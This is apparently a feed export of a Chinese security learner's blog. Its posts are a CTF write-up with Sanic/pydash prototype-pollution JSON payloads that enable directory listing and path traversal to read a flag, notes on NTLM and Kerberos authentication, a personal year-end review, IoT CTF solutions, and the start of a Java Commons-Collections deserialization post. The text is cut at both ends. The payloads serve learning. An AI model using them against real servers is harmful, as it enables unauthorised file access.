methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">AdminLook</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-comment">#方便管理员查看非法日志</span><br>    log_dir=os.popen(<span class="hljs-string">&#x27;ls /tmp -al&#x27;</span>).read();<br>    <span class="hljs-keyword">return</span> text(log_dir)<br>    <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/pollute&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">POLLUTE</span>(<span class="hljs-params">request</span>):<br>    key = request.json[<span class="hljs-string">&#x27;key&#x27;</span>]<br>    value = request.json[<span class="hljs-string">&#x27;value&#x27;</span>]<br>    <span class="hljs-keyword">if</span> key <span class="hljs-keyword">and</span> value <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(key) <span class="hljs-keyword">is</span> <span class="hljs-built_in">str</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;parts&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> key <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;proc&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(value) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(value) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">list</span>:<br>        pollute = Pollute()<br>        pydash.set_(pollute, key, value)<br>        <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;success&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        log_dir=create_log_dir(<span class="hljs-number">6</span>)<br>        log_dir_bak=log_dir+<span class="hljs-string">&quot;..&quot;</span><br>        log_file=<span class="hljs-string">&quot;/tmp/&quot;</span>+log_dir+<span class="hljs-string">&quot;/access.log&quot;</span><br>        log_file_bak=<span class="hljs-string">&quot;/tmp/&quot;</span>+log_dir_bak+<span class="hljs-string">&quot;/access.log.bak&quot;</span><br>        log=<span class="hljs-string">&#x27;key: &#x27;</span>+<span class="hljs-built_in">str</span>(key)+<span class="hljs-string">&#x27;|&#x27;</span>+<span class="hljs-string">&#x27;value: &#x27;</span>+<span class="hljs-built_in">str</span>(value);<br>        <span class="hljs-comment">#生成日志文件</span><br>        os.system(<span class="hljs-string">&quot;mkdir /tmp/&quot;</span>+log_dir)<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(log_file, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>             f.write(log)<br>        <span class="hljs-comment">#备份日志文件</span><br>        os.system(<span class="hljs-string">&quot;mkdir /tmp/&quot;</span>+log_dir_bak)<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(log_file_bak, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>             f.write(log)<br>        <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>得到hint</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">flag in /app,but you need to find his name！！！<br>Find a way to see the file names in the app directory<br></code></pre></td></tr></table></figure><p>这个hint也就提示我们列举目录<br>列举目录的方式也就是我们方才思路里说的<br>&#x3D;&#x3D;所以结合题目情况的总的思路就是，先开启目录列举，再构造或者找出一个带..的path，然后污染base使得current为..，这样就可以穿越到上层目录中实现列目录了&#x3D;&#x3D;<br>结合这两个难点被解决，以及如何列目录的方式被我们找到，那么一切都呼之欲出<br>payload如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler._parts&quot;,&quot;value&quot;: &quot;/&quot;&#125; #非法操作触发记录<br><br>&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;,&quot;value&quot;: true&#125; #开启目录列举<br><br>&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;,&quot;value&quot;: &quot;/tmp&quot;&#125; #切换目录到/tmp下<br><br>&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.base&quot;,&quot;value&quot;: &quot;static/4FokJS&quot;&#125; #污染base<br><br><br></code></pre></td></tr></table></figure><p>这样我们就可以在&#x2F;static&#x2F;4FokJS..&#x2F;下看到flag的名字了<br>但是这还不够，如果我们这个时候直接访问&#x2F;static&#x2F;app&#x2F;flag的话会出现如下情况<br><img src="/images/Pasted%20image%2020240723004441.png"><br>这是因为我们的file_or_directory还在&#x2F;tmp目录，我们需要切换到根目录，才能读到flag<br>那么有人说我既然都能看到flag了，为什么不能在&#x2F;static&#x2F;4FokJS..&#x2F;目录下直接读<br>就像这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://c4a6e774-5e02-4d07-b787-a7221e2bc985.node5.buuoj.cn:81/static/4FokJS../45W698WqtsgQT1_flag<br></code></pre></td></tr></table></figure><p>那么就要思考一个问题了，我们使用&#x2F;static&#x2F;4FokJS..&#x2F;的目的是什么，是为了构造出current为..来读取上层目录，如果直接这样读取，我们的current显然不再是..，那么&#x2F;static&#x2F;4FokJS..&#x2F;也就不再是上层目录了，所以这样才会找不到flag<br>所以我们还需要加一个payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;,&quot;value&quot;: &quot;/&quot;&#125; #切换回根目录<br></code></pre></td></tr></table></figure><p>我们继续污染file_or_directory到根目录，这样我们就可以通过&#x2F;app&#x2F;45W698WqtsgQT1_flag得到flag了</p>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>比赛wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NTLM认证学习</title>
    <link href="/2024/03/21/NTLM%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/03/21/NTLM%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="系统版本对LM和NTLM的支持"><a href="#系统版本对LM和NTLM的支持" class="headerlink" title="系统版本对LM和NTLM的支持"></a>系统版本对LM和NTLM的支持</h2><p><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240118194641.png" alt="image.png"></p><h2 id="NTLM-认证"><a href="#NTLM-认证" class="headerlink" title="NTLM 认证"></a>NTLM 认证</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>NTLM是NT LAN Manager的缩写，NTLM是指telnet的一种验证身份方式，即问询&#x2F;应答身份验证协议</p><h3 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h3><p>进行一个嫌弃自己的字好丑<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240117225706.png" alt="image.png"></p><p>这就是我理解的并且画的流程图</p><ol><li>用户登录客户端，进行<strong>本地认证</strong></li><li>客户端首先在本地将当前用户的密码加密为HTLM Hash</li><li>确认双方协议版本，客户端向服务器明文发送自己的账号</li><li>服务器返回一个十六位随机数，也就是图中的challenge</li><li>客户端需要使用本地的NTLM Hash来加密这个challenge并发回给服务器，也就是图中的response</li><li>服务器将明文的用户名、challenge、response发给域控制器（DC</li><li>域控制器用这个用户名在SAM密码管理库中找此用户对应的NTLM Hash</li><li>用这个NTLM Hash来加密服务器发过来的与发给用户端一样的challenge，与服务器端传过来的response进行对比，如果相同，那么就认证成功</li></ol><h4 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h4><p>Windows不会储存用户的明文密码，而是将明文密码加密后储存在SAM中</p><p>本地认证的过程中，用户登录时，系统会自动将用户输入的明文密码加密为NTLM Hash，然后和SAM中的NTLM Hash进行比较</p><h3 id="NTLM-Hash的生成"><a href="#NTLM-Hash的生成" class="headerlink" title="NTLM Hash的生成"></a>NTLM Hash的生成</h3><p>hhhh这个过程还算好吧，无非就是代码写了好多行突然发现可以五行之内解决）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib,binascii<br><br><span class="hljs-built_in">hash</span> = hashlib.new(<span class="hljs-string">&#x27;md4&#x27;</span>, <span class="hljs-string">&quot;fault&quot;</span>.encode(<span class="hljs-string">&#x27;utf-16le&#x27;</span>)).digest()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hash</span>)<br><br><span class="hljs-built_in">print</span>(binascii.hexlify(<span class="hljs-built_in">hash</span>))<br></code></pre></td></tr></table></figure><p>之前很迫切的没有用内置的方法去搞它，一直在那里进行一个手搓，嘛，最后的脚本在上面辣</p>]]></content>
    
    
    
    <tags>
      
      <tag>域相关</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kerberos协议学习</title>
    <link href="/2024/03/21/kerberos%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/03/21/kerberos%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>该协议涉及的攻击手段如下<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240117194836.png" alt="image.png"><br>理解协议过程所画的草稿图<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/aa84c82a24cfea51641782fb3471b4e.jpg" alt="aa84c82a24cfea51641782fb3471b4e.jpg"><br>鉴于我画的图丑晕了，于是在笔记中还是使用别人的图吧</p><h2 id="未引入TGS前的认证流程"><a href="#未引入TGS前的认证流程" class="headerlink" title="未引入TGS前的认证流程"></a>未引入TGS前的认证流程</h2><p><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240118203655.png" alt="image.png"><br>客户端向KDC发起对sessionkey的请求，KDC使用数据库中存储的该客户端的密码对sessionkey进行加密，同时向客户端请求的服务器发送同样的sessionkey，但使用服务器端的密码进行加密，然后客户端再使用sessionkey向服务器进行认证</p><p>在这个流程中我们可以发现一些问题<br>1.A向KDC申请sessionkey，KDC同时向A和B发送sessionkey，如果由于网络等原因导致B在A向它请求认证时还没有收到sessionkey就会导致认证失败，所以可以尝试在返回给A使用client password加密的sessionkey的时候将本该发给B的信息一同发送给A，再由A向B请求验证的时候一同发送给B<br>2.A提出SessionKey的申请时，KDC凭什么就生成了SessionKey给了A，也就是说，KDC缺乏对A的认证，所以在分发SessionKey之前，KDC需要增加对A的认证，解决办法就是，将KDC机构分成两部分：</p><blockquote><p>AS：Authentication Service，用于KDC对A的认证<br>  TGS：Ticket Granting Service，用于KDC向A和B分发Session Key</p></blockquote><h2 id="引入TGS后的认证流程"><a href="#引入TGS后的认证流程" class="headerlink" title="引入TGS后的认证流程"></a>引入TGS后的认证流程</h2><p><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240118204353.png" alt="image.png"><br>这个图也就很好的表明了将KDC分为AS和TGS后的作用，也就解决了刚才未引入TGS前我们提出的问题1和2，对于2的解决是只有当确认了A的身份后，才会给sessionkey(a-b)</p><p>总体来说就是当client想要访问server上的某个服务时，需要先向AS证明自己的身份，验证通过后AS会发放一个TGT，client会再次向TGS证明自己的身份后，TGS会发放一个ST，随后client向server发起认证请求</p><h2 id="详细认证过程"><a href="#详细认证过程" class="headerlink" title="详细认证过程"></a>详细认证过程</h2><p><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240118204825.png" alt="image.png"><br>①：KRB_AS_REQ：Client-A发送Authenticator向KDC的AS服务认证自己的身份（通过提供自身密码加密的一个时间戳TimeStamp）</p><p>②：KRB_AS_REP：AS通过KDC数据库中存储的Client-A密码的副本，解密收到的Authenticator，如果解密出的TimeStamp符合要求，则AS服务认为Client-A就是所谓的Client-A。认证成功后，AS服务生成一个短期有效的SessionKeya-kdc，将该Key使用A的密码副本加密成密文1，另外将Key连同时间戳标志（控制该SessionKey的有效时间）通过TGS服务的密码也就是KDC的密码加密为密文2（称为TGT），将这两个密文组合成KRB_AS_REP返回给Client-A</p><p>③：KRB_TGS_REQ：Client-A在接收到KRB_AS_REP后，首先使用自身密码解密密文1得到SessionKeya-kdc，此时需要注意的是，密文2（TGT）是被KDC的密码加密的，所以Client-A无法解密，这也是Kerberos协议设计的精妙之处，既解决了Server端（TGS相对于Client-A也称之为Server端）无法及时接收SessionKey的问题，又不怕Client-A对该TGT的伪造，因为Client-A不知道Server端的密码</p><p>得到SessionKeya-kdc后，Client-A利用其加密时间戳生成Authenticator用于向TGS申请Client-A与Client-B进行认证所需的SessionKeya-b，连同刚才KRB_AS_REP接收的TGT一同组合成KRB_TGS_REQ发送给TGS</p><p>④：KRB_TGS_REP：TGS在接收到KRB_TGS_REQ之后，利用KDC密码解密TGT获得本来就该发送给自己的SessionKeya-kdc，然后用其解密KRB_TGS_REQ中的Authenticator得到Client-A发送过来的时间戳，如果时间戳符合要求，则生成一个短期有效的SessionKeya-b，注意此时利用SessionKeya-kdc将SessionKeya-b加密为密文1，然后利用Server-B的密码将SessionKeya-b加密为密文2（称为ServiceTicket），两个密文一同构成KRB_TGS_REP返回给Client-A</p><p>⑤：KRB_AP_REQ：Client-A在接收到KRB_TGS_REP之后，首先使用缓存的SessionKeya-kdc将密文1中的SessionKeya-b解密出来，然后利用其加密时间戳生成Authenticator用于向B进行对自身的验证，另外，和刚才TGT一样，密文2也就是ServiceTicket是用Server-B的密码加密的，所以Client-A无法解密，也就无法伪造，这也同样解决了在三方认证中作为Server端的B无法及时接收SessionKey的问题，又不怕Client-A对ServiceTicket的伪造</p><p>⑥：KRB_AP_REP：Server-B受到KRB_AP_REQ之后，利用自身密码解密ServiceTicket，得到SessionKeya-b，然后用SessionKeya-b解密Authenticator得到时间戳，验证A的身份</p>]]></content>
    
    
    
    <tags>
      
      <tag>域相关</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023年终总结</title>
    <link href="/2024/03/21/2023/"/>
    <url>/2024/03/21/2023/</url>
    
    <content type="html"><![CDATA[<h1 id="fault的2023"><a href="#fault的2023" class="headerlink" title="fault的2023"></a>fault的2023</h1><h2 id="开端"><a href="#开端" class="headerlink" title="开端"></a>开端</h2><p>依稀记得今年的开始是刷题，彼时的我刚进入智邮普创一月有余，仍然在刷题积累的阶段，每周要交的周报便是最大的苦恼，周报内容是否完善，是否有收获，是否有质量，这三点便组成了我唯一的苦恼，现在说起来倒有些好笑，最开始的我竟然因为周报而烦恼过哈哈哈哈。在进入minink后有多了每周需要上交的刷题wp,，紧接着就是打N1 junior，对当时的我确实是一个不小的打击，从觉得自己学了很多到逐渐意识到自己甚至冰山一角都没有触及的过程是比较痛苦的，这就是我在今年遭受的第一次打击。周报与N1 junior,组成了我今年的开端。</p><h2 id="责任"><a href="#责任" class="headerlink" title="责任"></a>责任</h2><p>若要说起我今年学到最多的东西，很显然是责任，或者确切些说是如何成为一个大人。<br>去年刚从高中的大门走出，觉得大学里很多事情都很复杂，总是想躲到师傅身后，让他去替我做所有的决定，然后好逃避自己应该有的责任。从大一下学期开始，无论是与没见过的人打交道，亦或是和同级之间的交往合作，总是让我觉得压力倍增，好在我拥有实验室同级的鼓励和安慰以及师傅时不时的指导，在处理很多事情的时候也有人可以给我一些建议，一切的一切都让我觉得不那么孤单。<br>到了大二，成为了智邮普创安全组的负责人和A&amp;D协会副会长，我变得更加仔细小心，说话做事都得考虑三分，但当我看到协会在我的带领下变得更加有序的时候，学弟学妹在实验室安心学习的时候，我觉得这一切都很值得。我逐渐在变成自己大一时想成为的样子，有担当，可以肩负起自己身上的责任，即使带着整个实验室去发展，也可以做到处变不惊。</p><h2 id="自我怀疑"><a href="#自我怀疑" class="headerlink" title="自我怀疑"></a>自我怀疑</h2><p>今年的成长更多是在不断的自我怀疑中依然选择理清头脑，接着走下去。<br>从最开始怀疑自己的学习能力，到怀疑自己情商是否真的很低，再到怀疑自己是否真的适合当智邮普创安全组的负责人，每一次的自我怀疑都伴随着失眠和焦虑，我好多次以为自己会崩溃，会直接撂挑子不干，但其实并没有，而是选择在自我怀疑的崩溃中尽力去让自己理智的分析事情<br>虽然在这中间做了很多蠢事，也懊悔过，但自己的进步是能看得到的。无论是以副会长的名义去和老师谈与协会合作，还是以实验室安全组负责人的名义去做分享，我逐渐变得从容且张弛有度。<br>我觉得要让我深刻的改变，今年我所经历的自我怀疑与挣扎足矣。</p><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p>若要说今年收获了什么，那便是处理事情的能力，以及人际交往和技术的巨大提升。这一切都来自于处理协会、实验室以及各方人际关系所获得的。大大小小的奖也拿了不少，也逐渐在向自己所期望成为的大人的方向努力，一切的一切都让我觉得很棒很棒。不仅仅是自我能力的提升，在打CTF的过程中也让我收获了一批很好的朋友，更让我遇到了自己的伯乐和引路人。一切的一切都让我觉得今年收获真的很大～<br>今年的fault比去年进步了很多很多，有比赛的证书，有同级的友谊，有师长的帮助，有能力的提升，学会了技术，学会了为人处世的基础，也学会了爱，更学会了感恩。</p><h2 id="感恩"><a href="#感恩" class="headerlink" title="感恩"></a>感恩</h2><p>我觉得其实一路走来，我最应该感谢的就是我的师傅–cube ，是他带我入门了web，也是他不厌其烦的将很多东西传授给我，虽然过程很辛苦，也被鞭策过不少次，但我心中很清楚这一切都是为了让我变得更好。无论是最开始带我入门，回答一些很蠢的问题，还是之后引荐我，教我如何为人处世，一切的一切都慢慢将我塑造成了今天的样子。其实对真正感谢的人反而说不出来骚话，但确实，没有您就没有现在的fault，如果真要说我上大学以来最感谢的人，那一定是您（不会说骚话喵）。<br>接下来要感谢的就是maple，也是在今年帮助我很多的师傅，也是让我将技术上的自我怀疑变成目标和动力的一个转换契机。不仅在技术上帮我整合了之前学的很乱很粗的知识点，更是让我看到了真正的技术是什么样，以及我真正想拥有的技术需要我付出什么。<br>最后要感谢的就是Y爹，一些心态上的问题一直在找Y爹救救，也是从Y爹这儿，我感受到了一个真正合格的负责人该有的心态，担当以及统筹能力。而我也从Y爹这里学到了我感触很深的一句话“学会学习，学会生活”，我在接下来的学习生活中也在努力追求并实现这句话。<br>当然，除此之外要感谢的人太多太多，有老师，也有学长学姐和同级，没有你们的帮助，可能我还是一个迷茫不知所措的fault喵。谢谢大家～</p><h1 id="fault-的2024目标"><a href="#fault-的2024目标" class="headerlink" title="fault 的2024目标"></a>fault 的2024目标</h1><p>1、找个实习<br>2、学会更好的调控自己的情绪和生活<br>3、个人技术的提升<br>4、尽力让智邮普创变得更好<br>5、学一个新的方向并坚持下去<br>6、每周坚持写写周报，进行定期的自我正向反馈</p>]]></content>
    
    
    
    <tags>
      
      <tag>总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTF IOT题目复现</title>
    <link href="/2024/03/21/NSSCTF%20IOT%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/03/21/NSSCTF%20IOT%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="HGAME-2022-Week1-饭卡的uno"><a href="#HGAME-2022-Week1-饭卡的uno" class="headerlink" title="[HGAME 2022 Week1]饭卡的uno"></a>[HGAME 2022 Week1]饭卡的uno</h2><p>发现是hex文件，于是尝试直接拖到ida里逆向分析，发现直接可以拿到flag<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240115214046.png" alt="image.png"></p><h2 id="HGAME-2023-Week1-Help-marvin"><a href="#HGAME-2023-Week1-Help-marvin" class="headerlink" title="[HGAME 2023 Week1]Help marvin"></a>[HGAME 2023 Week1]Help marvin</h2><p>发现附件是一个.sr文件，在查找下发现了pulseview这个工具，于是尝试进行一个利用，结合提示的SPI，猜测是使用spi协议来解析这段</p><h3 id="SPI协议"><a href="#SPI协议" class="headerlink" title="SPI协议"></a>SPI协议</h3><p>链接：<a href="https://zhuanlan.zhihu.com/p/290620901">https://zhuanlan.zhihu.com/p/290620901</a></p><blockquote><p>1.用单独的数据线和单独的时钟信号来保证发送端和接收端的数据同步<br>2.产生始终的一侧称为主机，另一侧为从机，总是只有一个主机<br>3.数据采集在时钟信号上升沿或下降沿进行</p></blockquote><p>时钟是一个震荡信号，它告诉接收端在确切的时机对数据线上的信号进行采样</p><ul><li><p><strong>主机</strong>发送到<strong>从机</strong>时：主机产生相应的时钟信号，然后数据<strong>一位一位</strong>地将从<code>MOSI</code>信号线上进行发送到从机；  </p></li><li><p><strong>主机</strong>接收<strong>从机</strong>数据：如果从机需要将数据发送回主机，则主机将继续生成预定数量的时钟信号，并且从机会将数据通过<code>MISO</code>信号线发送；</p></li></ul><p>具体如图所示<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240115220645.png" alt="image.png"></p><p>SPI总线包括4条逻辑线，定义如下：</p><ul><li><p><strong>MISO</strong>：<code>Master input slave output</code> 主机输入，从机输出（数据来自从机）；  </p></li><li><p><strong>MOSI</strong>：<code>Master output slave input</code> 主机输出，从机输入（数据来自主机）；  </p></li><li><p><strong>SCLK</strong> ：<code>Serial Clock</code> 串行时钟信号，由主机产生发送给从机；  </p></li><li><p><strong>SS</strong>：<code>Slave Select</code> 片选信号，由主机发送，以控制与哪个从机通信，通常是低电平有效信号，但具体还是要查看芯片手册。</p></li></ul><h3 id="时钟频率"><a href="#时钟频率" class="headerlink" title="时钟频率"></a>时钟频率</h3><p>SPI总线上的主机必须在通信开始的时候配置并生成相应的时钟信号。在每个SPI时钟周期内，都会发生全双工数据传输。</p><p>主机在MOSI上发送一位数据，从机读取它，而从机在MISO线上发送一位数据，主机读取它。</p><p>所以综上所述，我们不难发现D1在其中扮演这片选信号的作用，而至于D2是主机发出还是从机发出的，这需要进行一手尝试，最终的数据如下<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240115224121.png" alt="image.png"><br>然后我们只需要对解出来的数据进行十六进制转字符就可以咯，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&quot;33,34,67,61,6D,65,7B,34,5F,35,74,34,6E,67,65,5F,53,70,31,7D&quot;</span><br><br>s=a.split(<span class="hljs-string">&#x27;,&#x27;</span>)<br><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(s)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br><br>    flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>))<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="HGAME-2023-week2-Pirated-router"><a href="#HGAME-2023-week2-Pirated-router" class="headerlink" title="[HGAME 2023 week2]Pirated router"></a>[HGAME 2023 week2]Pirated router</h2><p>发现附件是一个.bin文件，结合我之前读的一篇文章，尝试使用binwalk进行分离，但是发现分离后的文件中的squashfs-root文件夹是空的，走投无路下去查了wp，发现要使用如下工具<br><a href="https://github.com/rampageX/firmware-mod-kit">https://github.com/rampageX/firmware-mod-kit</a><br>然后尝试使用如下指令对.bin文件进行分解</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">./extract-firmware.sh /home/fault/Desktop/new/AC10086W_FW_1.1.4.5.bin<br><br></code></pre></td></tr></table></figure><p>然后分解出来的文件在工具目录中的fmk目录下，进去在bin目录下找到了类似于加密flag的可执行文件<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240115224848.png" alt="image.png"><br>于是二话不说，直接ida一把嗦，发现为arm架构的可执行文件，伪代码如下</p><p><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240115225046.png" alt="image.png"><br>查看unk_4543B0可知如下</p><p><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240115225136.png" alt="image.png"></p><p>逆向脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&quot;4B  44  42  4E  46  58  56  4D  53  17  40  48  12  4D  44  7C  45  4A  51  4E  54  42  51  46  7C  12  50  7C  10  62  50  5A  5E&quot;</span><br><br>s=a.split(<span class="hljs-string">&quot;  &quot;</span>)<br><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br><br>    flag+=<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>))+<span class="hljs-string">&quot; &quot;</span><br><br><span class="hljs-built_in">print</span>(flag+<span class="hljs-string">&quot; &quot;</span>)<br><br>a=<span class="hljs-string">&quot;75 68 66 78 70 88 86 77 83 23 64 72 18 77 68 124 69 74 81 78 84 66 81 70 124 18 80 124 16 98 80 90 94&quot;</span><br><br>s = a.split(<span class="hljs-string">&quot; &quot;</span>)<br><br>v6=<span class="hljs-number">35</span><br><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-comment"># print(s)</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br><br>    flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i)^<span class="hljs-number">35</span>)<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>然后就拿到了flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>IOT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>commonscollections-1</title>
    <link href="/2024/03/21/commonscollections-1/"/>
    <url>/2024/03/21/commonscollections-1/</url>
    
    <content type="html"><![CDATA[<h1 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h1><p>这是除yso中的LazyMap之外的另一种TransformedMap的链子<br>环境配置就不说了，网上太多教程了(实话说这环境配好好久了，每次调一半就开摆，这次一定一定不能摆了)<br>我们先从Transformer这个接口看起，来查找它的实现类<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204212413.png" alt="image.png"></p><p>我们在直奔主题前看到这个东西</p><h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p>这个代码我们瞅一眼它的transform方法<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204212729.png" alt="image.png"><br>它的功能很显而易见就是实现了一个链式递归调用，将前一个的输出作为后一个的输入，gadget也是需要这样的东西来帮助自动调用链的<br>好了，我们现在直接进入主题</p><h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p>很显然可以知道它继承了serializable，我们再去看看它的transform方法<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204213039.png" alt="image.png"></p><p>显然它在用反射来动态调用我们输入的对象和方法，这些全是我们自己可控的，这一听就是个很危险的东西，专业点说就是任意方法调用</p><p>我们尝试用这个方法弹计算器（典！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        